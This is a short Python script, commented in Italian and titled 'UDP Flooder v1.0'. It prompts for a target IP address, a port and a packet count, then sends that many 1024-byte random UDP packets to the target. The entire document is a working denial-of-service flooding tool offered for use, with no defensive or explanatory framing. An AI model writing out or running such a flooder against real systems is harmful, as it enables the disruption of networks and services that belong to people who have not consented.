#UDP Flooder

import socket
import random

print("UDP Flooder v1.0")

SRV_ADDR = input("Inserisci l'indirizzo IP > ")
SRV_PORT = int(input("Inserisci la porta > "))

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#Generatore casuale di byte
pacchetto = bytes([random.randint(0, 255) for _ in range(1024)])

npack = int(input("Numero pacchetti da inviare > "))

try:
        for i in range(npack):
                s.sendto(pacchetto,(SRV_ADDR, SRV_PORT))
                print("Pacchetto", i, "inviato!")
except:
        print("Invio non andato a buon fine!")

s.close()